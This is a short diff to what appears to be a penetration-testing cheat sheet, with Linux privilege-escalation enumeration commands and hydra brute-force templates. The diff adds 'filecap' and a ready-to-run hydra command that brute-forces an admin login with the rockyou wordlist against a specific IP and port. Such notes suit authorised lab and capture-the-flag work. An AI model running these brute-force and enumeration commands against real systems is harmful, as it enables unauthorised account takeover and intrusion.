@@ -71,6 +71,8 @@ sudo -l
 cat /etc/crontab
 find / -perm -u=s -type f 2>/dev/null
 netstat -tuln
+filecap
+
 ```
 
 Linepeas Installation on Target with and without internet
@@ -269,6 +271,7 @@ hydra -C <combinations.txt> <ip> <service>
 hydra -l <username> -P <passwords_file> <target_url> http-post-form "<post_data>:<failure_string>" #(post form)
 hydra -l <username> -P <passwords_file> <target_url> http-get #(get request login)
 hydra -l <username> -P <passwords_file> <target_url> http-get-form "<login_url>:<form_field_names>:<failure_string>:<cookie_string>"
+hydra -l admin -P '/home/kali/rockyou.txt' 34.170.40.47 -s 8080 http-post-form "/index.php:username=^USER^&password=^PASS^:Invalid username or password. Please try again."
 ```
 
 wireshark packet filters:
